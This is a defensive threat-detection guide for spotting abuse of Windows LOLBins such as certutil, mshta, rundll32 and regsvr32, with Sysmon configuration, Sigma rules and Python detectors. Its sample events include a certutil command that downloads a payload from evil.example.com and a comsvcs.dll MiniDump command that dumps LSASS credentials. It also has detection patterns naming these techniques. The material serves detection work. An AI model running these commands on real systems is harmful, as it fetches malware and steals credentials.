---
name: detecting-living-off-the-land-attacks
description: 'Detect abuse of legitimate Windows binaries (LOLBins) used for living
  off the land attacks. Monitors process creation, command-line arguments, and parent-child
  relationships to identify suspicious LOLBin execution patterns.

  '
domain: cybersecurity
subdomain: threat-detection
tags:
- lolbins
- lotl
- fileless-attacks
- process-monitoring
version: '1.0'
author: mahipal
license: Apache-2.0
d3fend_techniques:
- Application Protocol Command Analysis
- Network Isolation
- Network Traffic Analysis
- Client-server Payload Profiling
- Network Traffic Community Deviation
nist_csf:
- DE.CM-01
- DE.AE-02
- DE.AE-06
- ID.RA-05
mitre_attack:
- T1078
- T1190
- T1059
---

# Detecting Living Off the Land Attacks

Monitor for suspicious use of legitimate Windows binaries (LOLBins)
including certutil, mshta, rundll32, regsvr32, and others used in
fileless and living-off-the-land attack techniques.

## When to Use

- Building detection rules for SIEM or EDR platforms to catch LOLBin abuse in real time
- Investigating alerts where legitimate system binaries appear in unexpected execution contexts
- Threat hunting across endpoint telemetry for fileless attack indicators
- Hardening application whitelisting policies (AppLocker, WDAC) to restrict dangerous LOLBin usage
- Creating Sysmon configurations tuned to capture LOLBin-related process creation events
- Responding to incidents where adversaries bypassed AV by using only built-in OS tools

**Do not use** for blocking all LOLBin execution outright; these are legitimate system tools with valid administrative uses. Detection must focus on anomalous context (parent process, command-line arguments, network activity) rather than binary presence alone.

## Prerequisites

- Sysmon v15+ installed on Windows endpoints with a tuned configuration (SwiftOnSecurity or Olaf Hartong baseline)
- SIEM platform ingesting Sysmon Event IDs 1 (Process Create), 3 (Network Connection), 7 (Image Loaded), 11 (File Create)
- Windows Event Log forwarding for Security Event IDs 4688 (Process Creation with command-line logging enabled)
- LOLBAS project reference: https://lolbas-project.github.io/
- Python 3.8+ with `evtx`, `pandas` for offline log analysis
- Sigma rule repository for cross-platform detection rule authoring

## Workflow

### Step 1: Deploy a LOLBin-Focused Sysmon Configuration

Create a Sysmon config that captures the process creation and network events needed for LOLBin detection:

```xml
<!-- File: sysmon-lolbin-detection.xml -->
<Sysmon schemaversion="4.90">
  <EventFiltering>
    <!-- Process Creation: capture all LOLBin executions with full command lines -->
    <RuleGroup name="LOLBin Process Creation" groupRelation="or">
      <ProcessCreate onmatch="include">
        <Image condition="end with">certutil.exe</Image>
        <Image condition="end with">mshta.exe</Image>
        <Image condition="end with">rundll32.exe</Image>
        <Image condition="end with">regsvr32.exe</Image>
        <Image condition="end with">msbuild.exe</Image>
        <Image condition="end with">installutil.exe</Image>
        <Image condition="end with">cmstp.exe</Image>
        <Image condition="end with">wmic.exe</Image>
        <Image condition="end with">bitsadmin.exe</Image>
        <Image condition="end with">certreq.exe</Image>
        <Image condition="end with">esentutl.exe</Image>
        <Image condition="end with">expand.exe</Image>
        <Image condition="end with">extrac32.exe</Image>
        <Image condition="end with">findstr.exe</Image>
        <Image condition="end with">hh.exe</Image>
        <Image condition="end with">ie4uinit.exe</Image>
        <Image condition="end with">mavinject.exe</Image>
        <Image condition="end with">msiexec.exe</Image>
        <Image condition="end with">odbcconf.exe</Image>
        <Image condition="end with">pcalua.exe</Image>
        <Image condition="end with">presentationhost.exe</Image>
        <Image condition="end with">replace.exe</Image>
        <Image condition="end with">xwizard.exe</Image>
        <!-- PowerShell variants -->
        <Image condition="end with">powershell.exe</Image>
        <Image condition="end with">pwsh.exe</Image>
        <!-- Script hosts -->
        <Image condition="end with">cscript.exe</Image>
        <Image condition="end with">wscript.exe</Image>
      </ProcessCreate>
    </RuleGroup>

    <!-- Network connections from LOLBins (highly suspicious) -->
    <RuleGroup name="LOLBin Network" groupRelation="or">
      <NetworkConnect onmatch="include">
        <Image condition="end with">certutil.exe</Image>
        <Image condition="end with">mshta.exe</Image>
        <Image condition="end with">rundll32.exe</Image>
        <Image condition="end with">regsvr32.exe</Image>
        <Image condition="end with">msbuild.exe</Image>
        <Image condition="end with">bitsadmin.exe</Image>
        <Image condition="end with">expand.exe</Image>
        <Image condition="end with">esentutl.exe</Image>
        <Image condition="end with">replace.exe</Image>
      </NetworkConnect>
    </RuleGroup>
  </EventFiltering>
</Sysmon>
```

```powershell
# Install or update Sysmon with the LOLBin config
sysmon64.exe -accepteula -i sysmon-lolbin-detection.xml

# Update existing Sysmon installation
sysmon64.exe -c sysmon-lolbin-detection.xml
```

### Step 2: Build Sigma Detection Rules for Key LOLBins

Write Sigma rules that detect specific abuse patterns, translatable to any SIEM:

```yaml
# File: sigma/certutil_download.yml
title: Certutil Used to Download File
id: a1b2c3d4-5678-9abc-def0-123456789abc
status: stable
description: >
  Detects certutil.exe being used to download files from remote URLs,
  a common LOLBin technique for payload delivery (LOLBAS T1105).
references:
  - https://lolbas-project.github.io/lolbas/Binaries/Certutil/
  - https://attack.mitre.org/techniques/T1105/
author: Threat Detection Team
date: 2026/01/20
logsource:
  category: process_creation
  product: windows
detection:
  selection:
    Image|endswith: '\certutil.exe'
    CommandLine|contains|all:
      - 'urlcache'
      - '-f'
      - 'http'
  condition: selection
falsepositives:
  - Legitimate certificate enrollment using certutil with URL parameters
level: high
tags:
  - attack.defense_evasion
  - attack.t1218
  - attack.command_and_control
  - attack.t1105
```

```yaml
# File: sigma/mshta_execution.yml
title: MSHTA Executing Remote or Inline Script
id: b2c3d4e5-6789-abcd-ef01-234567890bcd
status: stable
description: >
  Detects mshta.exe executing scripts from URLs or inline VBScript/JavaScript,
  commonly used for application whitelisting bypass and initial access.
references:
  - https://lolbas-project.github.io/lolbas/Binaries/Mshta/
  - https://attack.mitre.org/techniques/T1218/005/
logsource:
  category: process_creation
  product: windows
detection:
  selection_remote:
    Image|endswith: '\mshta.exe'
    CommandLine|contains: 'http'
  selection_inline:
    Image|endswith: '\mshta.exe'
    CommandLine|contains:
      - 'vbscript:'
      - 'javascript:'
  selection_parent_anomaly:
    Image|endswith: '\mshta.exe'
    ParentImage|endswith:
      - '\winword.exe'
      - '\excel.exe'
      - '\outlook.exe'
      - '\powerpnt.exe'
  condition: selection_remote or selection_inline or selection_parent_anomaly
falsepositives:
  - Legacy HTA-based internal applications
level: high
```

```yaml
# File: sigma/regsvr32_scrobj.yml
title: Regsvr32 Squiblydoo Scriptlet Execution
id: c3d4e5f6-7890-bcde-f012-345678901cde
status: stable
description: >
  Detects regsvr32.exe loading scrobj.dll with a remote scriptlet URL,
  known as the Squiblydoo technique for AppLocker bypass.
references:
  - https://lolbas-project.github.io/lolbas/Binaries/Regsvr32/
  - https://attack.mitre.org/techniques/T1218/010/
logsource:
  category: process_creation
  product: windows
detection:
  selection:
    Image|endswith: '\regsvr32.exe'
    CommandLine|contains|all:
      - 'scrobj.dll'
      - '/i:'
  condition: selection
falsepositives:
  - Legitimate COM scriptlet registration (rare in modern environments)
level: critical
```

### Step 3: Analyze Sysmon Logs for LOLBin Abuse Patterns

Parse and correlate Sysmon events to identify suspicious LOLBin execution:

```python
import json
import re
from datetime import datetime, timedelta
from collections import defaultdict
from pathlib import Path

# Known LOLBins and their suspicious command-line indicators
LOLBIN_SIGNATURES = {
    "certutil.exe": {
        "suspicious_args": [
            r"-urlcache\s+-f\s+http",
            r"-decode\s+",
            r"-encode\s+",
            r"-verifyctl\s+.*http",
        ],
        "mitre": "T1218, T1105",
        "severity": "high"
    },
    "mshta.exe": {
        "suspicious_args": [
            r"https?://",
            r"vbscript:",
            r"javascript:",
            r"about:",
        ],
        "mitre": "T1218.005",
        "severity": "high"
    },
    "rundll32.exe": {
        "suspicious_args": [
            r"javascript:",
            r"shell32\.dll.*ShellExec_RunDLL",
            r"\\\\.*\\.*\.dll",  # UNC path DLL loading
            r"comsvcs\.dll.*MiniDump",  # LSASS dump via comsvcs
        ],
        "mitre": "T1218.011",
        "severity": "critical"
    },
    "regsvr32.exe": {
        "suspicious_args": [
            r"/s\s+/n\s+/u\s+/i:",
            r"scrobj\.dll",
            r"https?://",
        ],
        "mitre": "T1218.010",
        "severity": "critical"
    },
    "bitsadmin.exe": {
        "suspicious_args": [
            r"/transfer\s+.*https?://",
            r"/create\s+.*\/addfile\s+.*https?://",
            r"/SetNotifyCmdLine",
        ],
        "mitre": "T1197",
        "severity": "high"
    },
    "wmic.exe": {
        "suspicious_args": [
            r"process\s+call\s+create",
            r"/node:",
            r"os\s+get\s+/format:.*https?://",
            r"xsl.*https?://",
        ],
        "mitre": "T1047",
        "severity": "high"
    },
    "msbuild.exe": {
        "suspicious_args": [
            r"\.xml\b",
            r"\.csproj\b",
            r"\\temp\\",
            r"\\appdata\\",
        ],
        "mitre": "T1127.001",
        "severity": "high"
    },
    "mavinject.exe": {
        "suspicious_args": [
            r"/INJECTRUNNING\s+\d+",
        ],
        "mitre": "T1218.013",
        "severity": "critical"
    },
}

def analyze_sysmon_events(events):
    """Analyze Sysmon process creation events for LOLBin abuse."""
    alerts = []

    for event in events:
        image = event.get("Image", "").lower()
        cmdline = event.get("CommandLine", "")
        parent = event.get("ParentImage", "")

        # Check if the process is a known LOLBin
        for lolbin, config in LOLBIN_SIGNATURES.items():
            if image.endswith(lolbin.lower()):
                for pattern in config["suspicious_args"]:
                    if re.search(pattern, cmdline, re.IGNORECASE):
                        alert = {
                            "timestamp": event.get("UtcTime", ""),
                            "hostname": event.get("Computer", ""),
                            "lolbin": lolbin,
                            "command_line": cmdline,
                            "parent_process": parent,
                            "user": event.get("User", ""),
                            "process_id": event.get("ProcessId", ""),
                            "parent_pid": event.get("ParentProcessId", ""),
                            "mitre_technique": config["mitre"],
                            "severity": config["severity"],
                            "matched_pattern": pattern,
                        }
                        alerts.append(alert)
                        break
    return alerts

# Example usage with parsed Sysmon events
sample_events = [
    {
        "UtcTime": "2026-01-20 14:32:15.000",
        "Computer": "WORKSTATION-01",
        "Image": "C:\\Windows\\System32\\certutil.exe",
        "CommandLine": "certutil.exe -urlcache -f http://evil.example.com/payload.exe C:\\temp\\update.exe",
        "ParentImage": "C:\\Windows\\System32\\cmd.exe",
        "User": "CORP\\jsmith",
        "ProcessId": "4532",
        "ParentProcessId": "2108",
    },
    {
        "UtcTime": "2026-01-20 14:33:01.000",
        "Computer": "WORKSTATION-01",
        "Image": "C:\\Windows\\System32\\rundll32.exe",
        "CommandLine": "rundll32.exe comsvcs.dll, MiniDump 624 C:\\temp\\dump.bin full",
        "ParentImage": "C:\\Windows\\System32\\cmd.exe",
        "User": "CORP\\jsmith",
        "ProcessId": "5128",
        "ParentProcessId": "2108",
    },
]

alerts = analyze_sysmon_events(sample_events)
for alert in alerts:
    print(f"[{alert['severity'].upper()}] {alert['lolbin']} on {alert['hostname']}")
    print(f"  MITRE: {alert['mitre_technique']}")
    print(f"  Command: {alert['command_line'][:120]}")
    print(f"  Parent: {alert['parent_process']}")
    print(f"  User: {alert['user']}")
    print()
```

### Step 4: Detect LOLBin Network Connections

LOLBins making outbound network connections is a strong indicator of malicious use:

```python
def detect_lolbin_network_activity(network_events, process_events):
    """Correlate Sysmon network events (ID 3) with process creation (ID 1)
    to find LOLBins making outbound connections."""

    # LOLBins that should rarely make outbound connections
    NETWORK_SUSPICIOUS = {
        "certutil.exe", "mshta.exe", "rundll32.exe", "regsvr32.exe",
        "msbuild.exe", "installutil.exe", "bitsadmin.exe", "esentutl.exe",
        "expand.exe", "replace.exe", "cmstp.exe", "presentationhost.exe",
    }

    alerts = []
    for event in network_events:
        image = event.get("Image", "").lower()
        binary_name = image.split("\\")[-1] if "\\" in image else image

        if binary_name in NETWORK_SUSPICIOUS:
            dest_ip = event.get("DestinationIp", "")
            dest_port = event.get("DestinationPort", "")

            # Skip localhost and internal DNS
            if dest_ip.startswith("127.") or dest_ip == "::1":
                continue

            alert = {
                "type": "lolbin_network_connection",
                "binary": binary_name,
                "destination_ip": dest_ip,
                "destination_port": dest_port,
                "destination_hostname": event.get("DestinationHostname", ""),
                "source_ip": event.get("SourceIp", ""),
                "user": event.get("User", ""),
                "timestamp": event.get("UtcTime", ""),
                "severity": "critical",
            }
            alerts.append(alert)
            print(f"[CRITICAL] {binary_name} connected to "
                  f"{dest_ip}:{dest_port} ({event.get('DestinationHostname', 'N/A')})")

    return alerts
```

### Step 5: Monitor Anomalous Parent-Child Process Relationships

```python
# Suspicious parent-child relationships indicating LOLBin abuse
SUSPICIOUS_PARENT_CHILD = [
    # Office apps spawning LOLBins (macro execution)
    {"parent": ["winword.exe", "excel.exe", "powerpnt.exe", "outlook.exe"],
     "child": ["cmd.exe", "powershell.exe", "pwsh.exe", "mshta.exe",
               "wscript.exe", "cscript.exe", "certutil.exe"],
     "severity": "critical", "mitre": "T1204.002"},

    # Explorer spawning script interpreters directly
    {"parent": ["explorer.exe"],
     "child": ["mshta.exe", "regsvr32.exe", "msbuild.exe"],
     "severity": "high", "mitre": "T1218"},

    # WMI provider spawning processes (lateral movement)
    {"parent": ["wmiprvse.exe"],
     "child": ["cmd.exe", "powershell.exe", "mshta.exe"],
     "severity": "critical", "mitre": "T1047"},

    # Services spawning unusual children
    {"parent": ["services.exe"],
     "child": ["cmd.exe", "powershell.exe", "mshta.exe", "rundll32.exe"],
     "severity": "high", "mitre": "T1543.003"},
]

def check_parent_child_anomaly(event):
    """Check if a process creation event has a suspicious parent-child pair."""
    parent = event.get("ParentImage", "").split("\\")[-1].lower()
    child = event.get("Image", "").split("\\")[-1].lower()

    for rule in SUSPICIOUS_PARENT_CHILD:
        if parent in rule["parent"] and child in rule["child"]:
            return {
                "alert_type": "suspicious_parent_child",
                "parent": parent,
                "child": child,
                "command_line": event.get("CommandLine", ""),
                "mitre": rule["mitre"],
                "severity": rule["severity"],
                "hostname": event.get("Computer", ""),
                "user": event.get("User", ""),
                "timestamp": event.get("UtcTime", ""),
            }
    return None
```

### Step 6: Implement AppLocker or WDAC Hardening

Restrict unnecessary LOLBin execution with application control policies:

```powershell
# Query current AppLocker policy
Get-AppLockerPolicy -Effective | Select-Object -ExpandProperty RuleCollections

# Create AppLocker rules to restrict certutil to admin-only
$rule = New-AppLockerPolicy -RuleType Publisher -RuleNamePrefix "Block" `
    -FileInformation "C:\Windows\System32\certutil.exe" `
    -User "S-1-1-0" -Deny

# Export current policy for backup before applying changes
Get-AppLockerPolicy -Effective -Xml > AppLocker_Backup.xml

# Block specific LOLBins for standard users via GPO script
$lolbins_to_restrict = @(
    "mshta.exe", "cmstp.exe", "msbuild.exe", "installutil.exe",
    "regsvr32.exe", "presentationhost.exe", "ie4uinit.exe",
    "mavinject.exe", "xwizard.exe"
)

foreach ($binary in $lolbins_to_restrict) {
    $path = "C:\Windows\System32\$binary"
    if (Test-Path $path) {
        Write-Output "Restricting: $path"
        # Apply WDAC deny rule via PowerShell
        # In production, use Group Policy or Intune WDAC policies
    }
}
```

## Verification

- Confirm Sysmon is logging Event ID 1 (Process Creation) with full command-line arguments for all listed LOLBins
- Validate Sigma rules convert correctly to your SIEM query language using `sigmac` or `sigma-cli`
- Test detection by executing benign LOLBin commands in a lab environment and confirming alerts fire
- Verify parent-child anomaly detection catches Office-to-LOLBin chains (e.g., `winword.exe` spawning `certutil.exe`)
- Confirm LOLBin network connection detection triggers when `certutil.exe` or `mshta.exe` reach out to external IPs
- Check that AppLocker or WDAC policies do not break legitimate administrative workflows before deploying to production
- Validate false positive rates by running detection rules against 7 days of baseline telemetry from a clean environment
- Cross-reference detections against the LOLBAS project database at https://lolbas-project.github.io/ for completeness
